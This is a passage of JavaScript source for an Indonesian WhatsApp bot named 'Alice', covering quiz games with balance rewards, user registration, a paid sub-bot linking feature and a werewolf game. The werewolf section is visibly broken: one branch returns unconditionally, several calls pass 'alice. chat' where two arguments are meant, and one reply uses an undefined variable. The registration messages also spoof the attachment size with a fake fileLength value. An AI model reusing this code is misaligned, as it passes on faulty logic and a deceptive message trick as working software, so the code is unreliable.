// GAME TEBAK LIRIK BY DARWIN
if ((from in tebaklirik)) {
let { soal, jawaban, hadiah, waktu } = tebaklirik[from]
if (budy.toLowerCase() == "nyerah") {
reply795(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebaklirik[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await reply795(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
alice.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete tebaklirik[from];
} else await alice.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK KIMIA BY DARWIN
if ((from in tebakkimia)) {
let { soal, jawaban, hadiah, waktu } = tebakkimia[from]
if (budy.toLowerCase() == "nyerah") {
reply795(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakkimia[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await reply795(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
alice.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
clearTimeout(waktu);
delete tebakkimia[from];
} else alice.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK BENDERA BY DARWIN
if ((from in tebakbendera)) {
let { soal, jawaban, hadiah, waktu } = tebakbendera[from]
if (budy.toLowerCase() == "nyerah") {
reply795(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakbendera[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await reply795(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
alice.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete tebakbendera[from];
} else alice.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME ASAH OTAK BY DARWIN
if ((from in asahotak)) {
let { soal, jawaban, hadiah, waktu } = asahotak[from]
if (budy.toLowerCase() == "nyerah") {
reply795(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete asahotak[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await reply795(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
alice.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete asahotak[from];
} else alice.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME SUSUN KATA BY DARWIN
if ((from in susunkata)) {
let { soal, jawaban, hadiah, waktu } = susunkata[from]
if (budy.toLowerCase() == "nyerah") {
reply795(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete susunkata[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await reply795(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
alice.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete susunkata[from];
} else alice.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME CAK LONTONG BY DARWIN
if ((from in caklontong)) {
let { soal, jawaban, hadiah, waktu } = caklontong[from]
if (budy.toLowerCase() == "nyerah") {
reply795(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete caklontong[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await reply795(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
alice.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete caklontong[from];
} else alice.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME KUIS MATH BY DARWIN
if ((from in kuismath)) {
let { soal, jawaban, hadiah, waktu } = kuismath[from]
if (budy.toLowerCase() == "nyerah") {
reply795(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete kuismath[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await reply795(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
alice.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete kuismath[from];
} else alice.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME FAMILY 100 BY DARWIN
if ((from in family100)) {
let { soal, jawaban, hadiah, waktu } = family100[from]
for (let i of jawaban){
if (budy.toLowerCase() == "nyerah") {
await reply795(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 0`);
delete family100[from]
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
let anu = jawaban.indexOf(i)
jawaban.splice(anu, 1)
await reply795(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban.length < 1 ? 'Selamat semua jawaban sudah tertebak!\ningin bermain lagi? kirim '+prefix+'family100' : 'Jawaban yang belum tertebak: '+jawaban.length}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
alice.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
clearTimeout(waktu);
delete family100[from];
} else alice.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}
if (jawaban.length < 1){
clearTimeout(waktu);
delete family100[from];
}
}

// FUNCTION BY DARWIN
function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}
    



















// FUNCTION JOIN BEFORE COMMAND BY DARWIN
/*const metadata = await alice.groupMetadata (global.owner)
if (!metadata.participants.map(a => a.id).includes(m.sender)) {
if (command) return reply795(`${tag} anda belum bergabung kedalam group Alice, harap bergabung terlebih dahulu sebelum menggunakan fitur ini\n\n${global.group}`)
}*/


// PENGALIH
switch (command) {

// FITUR USER
case 'ceklimit': case 'limit': {
if (m.quoted || text) {
if (!(froms in users)) return reply('User tidak terdaftar didalam database!')
reply(`${users[froms].name}\n\nStatus: ${users[froms].premium ? 'Premium' : 'Gratisan'}\nLimit: ${users[froms].premium ? 'Uneed' : users[froms].limit + '/' + 15}`)
} else if (m.sender) {
reply(`${users[m.sender].name}\n\nStatus: ${users[m.sender].premium ? 'Premium' : 'Gratisan'}\nLimit: ${users[m.sender].premium ? 'Unlimited' : users[m.sender].limit + '/' + 15}`)
}
}
break
case 'ljb':
var data = Object.values(global.db.jadibot).filter(v => v.jid)
if (data.length == 0) return reply('*Data kosong.*')
var teks = '乂  *L I S T  U S E R  B O T*\n'
teks += data.map((v, i) => `\n${i + 1}. @${v.jid.split('@')[0]}`).join(``)
sendMessageModify(m.chat, teks, m, {
thumbUrl: 'https://telegra.ph/file/ef5693dae2176c8b441b3.jpg',
//sourceUrl: 'https://ẉ.ceo/Darwin'
largeThumb: true
})
break //Powered By alice & Darwin
case 'daftar':
if (isRegistered) return reply('Kamu sudah terdaftar')
if (!q.includes('.')) return reply('*Format salah! Gunakan Dengan*\n\n    *Contoh :* .daftar Darwin.19')
const namaUser = q.substring(0, q.indexOf('.') - 0)
const umurUser = q.substring(q.lastIndexOf('.') + 1)
const serialUser = createSerial(20)
if(isNaN(umurUser)) return reply('Umur harus berupa angka!!')
if (namaUser.length >= 30) return reply(`why is your name so long it's a name or a train`)
if (umurUser > 40) return reply(`your age is too  old maximum 40 years`)
if (umurUser < 12) return reply(`your age is too young minimum 12 years`)
let mzd = `*DAFTAR BERHASIL*\n\n⎋ Nama : ${namaUser}\n⎋ Umur : ${umurUser}\n⎋ Nomor : @${m.sender.split("@")[0]}\n⎋ Premium : ${isPremium}\n⎋ Limit : ${limit}\n⎋ Register : ${calender}`
let veri = m.sender
if (!m.isGroup) {
addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
alice.sendMessage(from, {image: ppnyauser, caption: mzd, fileLength: 9999778866, contextInfo: {
externalAdReply: {
showAdAttribution: true, 
mediaType: 1, 
previewType: 'PHOTO',
renderLargerThumbnail: false, 
title: `${namaUser} Terdaftar ✅`, 
body: `powered by winn`, 
description: 'no text',
mediaType: 1,
thumbnail: ppnyauser,
sourceUrl: `${global.saluran}`,
}}
})
} else {
addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
alice.sendMessage(from, {image: ppnyauser, caption: mzd, fileLength: 9999778866, contextInfo: {
externalAdReply: {
showAdAttribution: true, 
mediaType: 1, 
previewType: 'PHOTO',
renderLargerThumbnail: false, 
title: `${namaUser} Terdaftar ✅`, 
body: `powered by winn`, 
description: 'no text',
mediaType: 1,
thumbnail: ppnyauser,
sourceUrl: `${global.saluran}`,
}}
})
}
break
case 'totalfitur':
const totalFitur = () =>{
            var mytext = fs.readFileSync("./alice.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
reply(`Command Alice Tersedia Sebanyak ${totalFitur()}`)
break
case 'listban': 
var data = Object.values(db.users).filter(v => v.banned)
if (data.length == 0) return reply('*Data kosong.*')
var teks = '乂  *L I S T  B A N N E D*\n'
teks += data.map((v, i) => `\n${i + 1}. @${v.jid.split('@')[0]}`).join('\n')
sendMessageModify(m.chat, teks, m, {
thumbUrl: 'https://telegra.ph/file/ae4413e295ec14491d23b.png',
largeThumb: true
})
break //Powered By alice & Darwin

case 'carajadibot':
case 'cara-pasang':
let tutor1 = '*Step 1* ketik *start* untuk mendapat kode koneksi bot anda dari *Alice*'
let tutor2 = '*Step 2* kembali ke home WhatsApp lalu klik *titik tiga* di samping pojok kanan atas, lalu klik *Perangkat tertaut*'
let tutor3 = '*Step 3* klik *Tautkan perangkat*'
let tutor4 = '*Step 4* untuk cara memasukan kode klik *Tautkan dengan nomor telepon saja*'
let tutor5 = '*Step 5* masukan kode anda'
let imej1 = "https://telegra.ph/file/37a9b2865634333b25168.jpg"
let imej2 = "https://telegra.ph/file/cba5cd9154a4ffc4b2ae4.jpg"
let imej3 = "https://telegra.ph/file/cb39c8ab221045fb4a6e7.jpg"
let imej4 = "https://telegra.ph/file/a11753d255c49c0decac2.jpg"
let imej5 = "https://telegra.ph/file/e97424c82f58caa3109a8.jpg"
reply('untuk cara penggunaan, ikuti panduan berikut')
await delay(3000)
reply('pertama, sebelum menggunakan bot')
await delay(3000)
reply('pastikan anda sudah tahu cara pemasangan untuk mengkoneksikan bot anda dengan *Alice*')
await delay(3000)
reply('berikut adalah caranya')
await delay(3000)
alice.sendMessage(from, {image: {url: imej1}, caption: tutor1})
await delay(3000)
alice.sendMessage(from, {image: {url: imej2}, caption: tutor2})
await delay(3000)
alice.sendMessage(from, {image: {url: imej3}, caption: tutor3})
await delay(3000)
alice.sendMessage(from, {image: {url: imej4}, caption: tutor4})
await delay(3000)
alice.sendMessage(from, {image: {url: imej5}, caption: tutor5})
break
case 'jdb':
const { jadibot } = require('./system/jadibot')
await jadibot(alice, m.sender, m)
break
case 'start': case 'jadibot': case 'buatbot':
if (cekSaldo(sender,db_saldo) < 15000) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 15,000 untuk mengakses fitur ini, silahkan bermain game/topup untuk mendapat saldo`)
startbot(alice, m, from)
alice.sendMessage(from, {text:`*[ Pay Success ] Rp.* 15,000`})
minSaldo(sender, 15000, db_saldo)
break //Powered By alice & Darwin
case 'stop': case 'stopjadibot':
reply(mess.wait)
rimraf.sync(`./system/userclone/${m.sender}`)
await delay(2000)
reply('suksess stop bot & sesi anda di hapus')
break
case 'listbot': case 'listjadibot': case 'userbot':
try {
let user = [... new Set([...global.conns.filter(alice => alice.user).map(alice => alice.user)])]
te = "*ALICE USERBOT*\n\n"
for (let i of user){
y = await alice.decodeJid(i.id)
te += "User : @" + y.split("@")[0] + "\n"
te += "Name : " + i.name + "\n\n"
}
//alice.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
reply795(te)
} catch (err) {
reply795(`Tidak ada user yang terkoneksi`)
}
break































// FITUR GAMES BY DARWIN
case 'wwpc':
case 'ww':
case 'werewolf': {
let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    runprefixagi
} = require('./lib/werewolf.js')

// [ Thumbnail ] 
let thumb =
    "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

    const {
        sender,
        chat
    } = m;
    alice.werewolf = alice.werewolf ? alice.werewolf : {};
    const ww = alice.werewolf ? alice.werewolf : {};
    const data = ww[chat];
    const value = args[0];
    const target = args[1];
let byId = getPlayerById2(sender, parseInt(target), ww); 
    // [ Membuat Room ]
    if (value === "create") {
        if (chat in ww) return reply("Group masih dalam sesi permainan");
        if (playerOnGame(sender, ww) === true)
            return reply("Kamu masih dalam sesi game");
        ww[chat] = {
            room: chat,
            owner: sender,
            status: false,
            iswin: null,
            cooldown: null,
            day: 0,
            time: "malem",
            player: [],
            dead: [],
            voting: false,
            seer: false,
            guardian: [],
        };
        await reply("Room berhasil dibuat, ketik *.ww join* untuk bergabung");

        // [ Join sesi permainan ]
    } else if (value === "join") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].status === true)
            return reply("Sesi permainan sudah dimulai");
        if (ww[chat].player.length > 16)
            return reply("Maaf jumlah player telah penuh");
        if (playerOnRoom(sender, chat, ww) === true)
            return reply("Kamu sudah join dalam room ini");
        if (playerOnGame(sender, ww) === true)
            return reply("Kamu masih dalam sesi game");
        let data = {
            id: sender,
            number: ww[chat].player.length + 1,
            sesi: chat,
            status: false,
            role: false,
            effect: [],
            vote: 0,
            isdead: false,
            isvote: false,
        };
        ww[chat].player.push(data);
        let player = [];
        let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )}\n`;
            player.push(ww[chat].player[i].id);
        }
        text += "\nJumlah player minimal adalah 5 dan maximal 15";
        alice.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "https://whatsapp.com/channel/0029Va9scP6CxoAqmRtHG73T",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );

        // [ Game Play ]
    } else if (value === "start") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].player.length === 0)
            return reply("Room belum memiliki player");
        if (ww[chat].player.length < 5)
            return reply("Maaf jumlah player belum memenuhi syarat");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu belum join dalam room ini");
        if (ww[chat].cooldown > 0) {
            if (ww[chat].time === "voting") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_vote(alice. chat, ww);
            } else if (ww[chat].time === "malem") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_malam(alice. chat, ww);
            } else if (ww[chat].time === "pagi") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await runprefixagi(alice. chat, ww);
            }
        }
        if (ww[chat].status === true)
            return reply("Sesi permainan telah dimulai");
        if (ww[chat].owner !== sender)
            return reply(
                `Hanya @${ww[chat].owner.split("@")[0]} yang dapat memulai permainan`
            );
        let list1 = "";
        let list2 = "";
        let player = [];
        roleGenerator(chat, ww);
        addTimer(chat, ww);
        startGame(chat, ww);
        for (let i = 0; i < ww[chat].player.length; i++) {
            list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")}\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")} ${
          ww[chat].player[i].role === "werewolf" ||
          ww[chat].player[i].role === "sorcerer"
            ? `[${ww[chat].player[i].role}]`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            // [ Werewolf ]
            if (ww[chat].player[i].role === "werewolf") {
                if (ww[chat].player[i].isdead != true) {
                    var textt = `Hai ${alice.getName(
              ww[chat].player[i].id
            )}, Kamu telah dipilih untuk memerankan *Werewolf* ${emoji_role(
              "werewolf"
            )} pada permainan kali ini, silahkan pilih salah satu player yang ingin kamu makan pada malam hari ini\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc kill nomor* untuk membunuh player`;
                    await alice.sendMessage(ww[chat].player[i].id, {
                        text: textt,
                        mentions: player,
                    });
                }
                        // [ villager ]
            } else if (ww[chat].player[i].role === "warga") {
                if (ww[chat].player[i].isdead != true) {
                    let texttt = `*⌂ W E R E W O L F - G A M E*\n\nHai ${alice.getName(
              ww[chat].player[i].id
            )} Peran kamu adalah *Warga Desa* ${emoji_role(
              "warga"
            )}, tetap waspada, mungkin *Werewolf* akan memakanmu malam ini, silakan masuk kerumah masing masing.\n*LIST PLAYER*:\n${list1}`;
                    await alice.sendMessage(ww[chat].player[i].id, {
                        text: texttt,
                        mentions: player,
                    });
                }

                // [ Penerawangan ]
            } else if (ww[chat].player[i].role === "seer") {
                if (ww[chat].player[i].isdead != true) {
                    let texxt = `Hai ${alice.getName(
              ww[chat].player[i].id
            )} Kamu telah terpilih  untuk menjadi *Penerawang* ${emoji_role(
              "seer"
            )}. Dengan sihir yang kamu punya, kamu bisa mengetahui peran pemain pilihanmu.\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc dreamy nomor* untuk melihat role player`;

                    await alice.sendMessage(ww[chat].player[i].id, {
                        text: texxt,
                        mentions: player,
                    });
                }

                // [ Guardian ]
            } else if (ww[chat].player[i].role === "guardian") {
                if (ww[chat].player[i].isdead != true) {
                    let teext = `Hai ${alice.getName(
              ww[chat].player[i].id
            )} Kamu terpilih untuk memerankan *Malaikat Pelindung* ${emoji_role(
              "guardian"
            )}, dengan kekuatan yang kamu miliki, kamu bisa melindungi para warga, silahkan pilih salah 1 player yang ingin kamu lindungi\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc deff nomor* untuk melindungi player`;
  
                    await alice.sendMessage(ww[chat].player[i].id, {
                        text: teext,
                        mentions: player,
                    });
                }

                // [ Sorcerer ]
            } else if (ww[chat].player[i].role === "sorcerer") {
                if (ww[chat].player[i].isdead != true) {
                    let textu = `Hai ${alice.getName(
              ww[chat].player[i].id
            )} Kamu terpilih sebagai Penyihir ${emoji_role(
              "sorcerer"
            )}, dengan kekuasaan yang kamu punya, kamu bisa membuka identitas para player, silakan pilih 1 orang yang ingin kamu buka identitasnya\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc sorcerer nomor* untuk melihat role player`;

                    await alice.sendMessage(ww[chat].player[i].id, {
                        text: textu,
                        mentions: player,
                    });
                }
            }
        }
        await alice.sendMessage(m.chat, {
            text: "*⌂ W E R E W O L F - G A M E*\n\nGame telah dimulai, para player akan memerankan perannya masing masing, silahkan cek chat pribadi untuk melihat role kalian. Berhati-hatilah para warga, mungkin malam ini adalah malah terakhir untukmu",
            contextInfo: {
                externalAdReply: {
                    title: "W E R E W O L F",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnail: await resize(thumb, 300, 175),
                    sourceUrl: "https://whatsapp.com/channel/0029Va9scP6CxoAqmRtHG73T",
                    mediaUrl: thumb,
                },
                mentionedJid: player,
            },
        });
        await run(alice. chat, ww);
    } else if (value === "kill") {
       if (byId.db.role === "sorcerer") 
         if (dataPlayer(sender, ww).role !== "werewolf") 
             return m.reply("Peran ini bukan untuk kamu"); 
             return m.reply("Tidak bisa menggunakan skill untuk teman"); 
                  if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
      reply("Berhasil membunuh player " + parseInt(target)) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
                 killWerewolf(sender, parseInt(target), ww); 
             }); 
     } else if (value === "dreamy") { 
         if (dataPlayer(sender, ww).role !== "seer") 
             return m.reply("Peran ini bukan untuk kamu"); 
                  if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
         let dreamy = dreamySeer(m.sender, parseInt(target), ww); 
         reply(`Berhasil membuka identitas player ${target} adalah ${dreamy}`) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
             }); 
     } else if (value === "deff") { 
         if (dataPlayer(sender, ww).role !== "guardian") 
             return m.reply("Peran ini bukan untuk kamu"); 
                  if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
         reply(`Berhasil melindungi player ${target}`).then(() => { 
             protectGuardian(m.sender, parseInt(target), ww); 
             dataPlayer(sender, ww).status = true; 
         }); 
     } else if (value === "sorcerer") { 
         if (dataPlayer(sender, ww).role !== "sorcerer") 
             return m.reply("Peran ini bukan untuk kamu"); 
             if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
         let sorker = sorcerer(sesi(m.sender), target); 
          reply(`Berhasil membuka identitas player ${player} adalah ${sorker}`) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
             }); 
     } else if (value === "vote") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].status === false)
            return reply("Sesi permainan belum dimulai");
        if (ww[chat].time !== "voting")
            return reply("Sesi voting belum dimulai");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu bukan player");
        if (dataPlayer(sender, ww).isdead === true)
            return reply("Kamu sudah mati");
        if (!target || target.length < 1)
            return reply("Masukan nomor player");
        if (isNaN(target)) return reply("Gunakan hanya nomor");
        if (dataPlayer(sender, ww).isvote === true)
            return reply("Kamu sudah melakukan voting");
        b = getPlayerById(chat, sender, parseInt(target), ww);
        if (b.db.isdead === true)
            return reply(`Player ${target} sudah mati.`);
        if (ww[chat].player.length < parseInt(target))
            return reply("Invalid");
        if (getPlayerById(chat, sender, parseInt(target), ww) === false)
            return reply("Player tidak terdaftar!");
        vote(chat, parseInt(target), sender, ww);
        return reply("✅ Vote");
    } else if (value == "exit") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].status === true)
            return reply("Permainan sudah dimulai, kamu tidak bisa keluar");
        let exitww = `${sender.split("@")[0]} Keluar dari permainan`
                alice.sendMessage(
            m.chat, {
                text: exitww,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "https://whatsapp.com/channel/0029Va9scP6CxoAqmRtHG73T",
                        mediaUrl: thumb,
                    },
                    mentionedJid: sender,
                },
            }, {
                quoted: m
            }
        );  
        playerExit(chat, sender, ww);
    } else if (value === "delete") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (ww[chat].owner !== sender)
            return reply(
                `Hanya @${
            ww[chat].owner.split("@")[0]
          } yang dapat menghapus sesi permainan ini`
            );
        reply("Sesi permainan berhasil dihapus").then(() => {
            delete ww[chat];
        });
    } else if (value === "player") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].player.length === 0)
            return reply("Sesi permainan belum memiliki player");
        let player = [];
        let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )} ${
          ww[chat].player[i].isdead === true
            ? `☠️ ${ww[chat].player[i].role}`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        alice.sendMessage(
            m.chat, {
                text: text,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "https://whatsapp.com/channel/0029Va9scP6CxoAqmRtHG73T",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );
    } else {
        let text = `\n*⌂ W E R E W O L F - G A M E*\n\nPermainan Sosial Yang Berlangsung Dalam Beberapa Putaran/ronde. Para Pemain Dituntut Untuk Mencari Seorang Penjahat Yang Ada Dipermainan. Para Pemain Diberi Waktu, Peran, Serta Kemampuannya Masing-masing Untuk Bermain Permainan Ini\n\n*⌂ C O M M A N D*\n`;
        text += ` • ww create\n`;
        text += ` • ww join\n`;
        text += ` • ww start\n`;
        text += ` • ww exit\n`;
        text += ` • ww delete\n`;
        text += ` • ww player\n`;
        text += `\nPermainan ini dapat dimainkan oleh 5 sampai 15 orang.`;
        alice.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: `${global.saluran}`,
                        mediaUrl: thumb,
                    },
                },
            }, {
                quoted: m
            }
        );
    }
}
break
case 'suit':
if(!isGroup) return onlyGroup()
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
